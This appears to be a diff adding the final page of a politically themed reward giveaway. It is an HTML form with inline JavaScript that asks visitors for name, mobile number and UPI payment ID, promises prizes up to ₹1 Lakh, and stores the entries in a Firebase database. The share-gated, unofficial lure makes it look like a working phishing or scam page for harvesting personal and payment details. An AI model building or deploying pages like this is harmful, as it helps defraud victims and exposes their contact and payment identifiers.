@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Reward</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="background-container"></div>
+    <div class="container">
+        <header>
+            <h1>🎊 Final Step: Enter your UPI ID to receive your reward</h1>
+        </header>
+        <main>
+            <form id="reward-form">
+                <div class="form-group">
+                    <label for="name">Full Name</label>
+                    <input type="text" id="name" name="name" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Mobile Number</label>
+                    <input type="tel" id="phone" name="phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="upi">UPI ID (PhonePe / Google Pay)</label>
+                    <input type="text" id="upi" name="upi" required>
+                </div>
+                <div class="form-group">
+                    <label for="reward">Your Reward</label>
+                    <input type="text" id="reward" name="reward" readonly>
+                </div>
+                <button type="submit" class="cta-button glow">Submit Details</button>
+            </form>
+            <div id="submission-message" class="hidden">
+                <p>✅ Your reward request has been received. It will be processed within 7 days via UPI. Winners of ₹1 Lakh and VIP Dinner will be contacted directly.</p>
+            </div>
+        </main>
+    </div>
+    
+    <footer>
+        <p>This is a voluntary initiative by BJP supporters and not officially affiliated with the Government of India. Rewards are privately sponsored. Inspired respectfully by PM Narendra Modi’s vision.</p>
+    </footer>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    
+    <!-- Your scripts -->
+    <script src="firebase-config.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const rewardForm = document.getElementById('reward-form');
+            const submissionMessage = document.getElementById('submission-message');
+            const rewardInput = document.getElementById('reward');
+
+            const claimedReward = localStorage.getItem('userReward');
+            if (claimedReward) {
+                rewardInput.value = claimedReward;
+            } else {
+                window.location.href = 'index.html';
+            }
+
+            const db = firebase.firestore();
+
+            rewardForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+
+                const name = document.getElementById('name').value;
+                const phone = document.getElementById('phone').value;
+                const upi = document.getElementById('upi').value;
+                
+                if (!name || !phone || !upi) {
+                    alert('Please fill all fields.');
+                    return;
+                }
+                if (!upi.includes('@')) {
+                    alert('Please enter a valid UPI ID.');
+                    return;
+                }
+
+                db.collection('submissions').add({
+                    name: name,
+                    phone: phone,
+                    upi: upi,
+                    reward: claimedReward,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                })
+                .then(() => {
+                    rewardForm.classList.add('hidden');
+                    submissionMessage.classList.remove('hidden');
+                    localStorage.removeItem('userReward');
+                    localStorage.removeItem('shareCount');
+                })
+                .catch((error) => {
+                    console.error("Error adding document: ", error);
+                    alert('There was an error submitting your request. Please try again.');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
